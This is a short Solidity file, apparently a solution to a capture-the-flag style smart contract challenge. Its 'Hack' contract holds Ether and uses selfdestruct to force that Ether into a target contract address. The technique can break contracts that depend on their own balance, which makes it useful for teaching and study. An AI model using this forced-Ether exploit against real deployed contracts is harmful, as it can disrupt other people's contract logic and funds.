// SPDX-License-Identifier: MIT
pragma solidity ^0.6.5;

contract happy {

}

contract Hack {
    constructor () public payable {
      // this allows us to send some Ether into the contract 
    }

    function getBalance() public view returns (uint256) {
      return address(this).balance;
    }

     function die (address _instanceAddr) public  {
      // selfdestruct will force any ether in this contract to the address below
      selfdestruct(payable(address(_instanceAddr)));
    }

}